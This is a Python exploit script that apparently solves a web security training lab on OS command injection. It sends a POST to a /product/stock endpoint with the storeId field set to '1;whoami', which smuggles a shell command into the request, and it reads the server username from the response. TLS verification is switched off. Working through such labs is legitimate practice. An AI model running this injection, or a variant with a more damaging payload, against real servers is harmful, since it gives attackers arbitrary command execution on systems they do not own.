#!/usr/bin/env python3
import requests
import sys
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def injection(s, url):
    stock_url = url + "/product/stock"
    payload = "whoami"
    data = {"productId": "1", "storeId": f"1;{payload}"}
    r = s.post(stock_url, data=data, verify=False)
    output =  re.search(r"peter-[A-Za-z0-9]{6}", r.text)
    if output:
        print("[+] Lab solved")
        print(f"[+] User: {output.group(0)}")
    else:
        print("[-] Error with command injection")

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <url>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")
    injection(s, url)

if __name__=="__main__":
    main()    
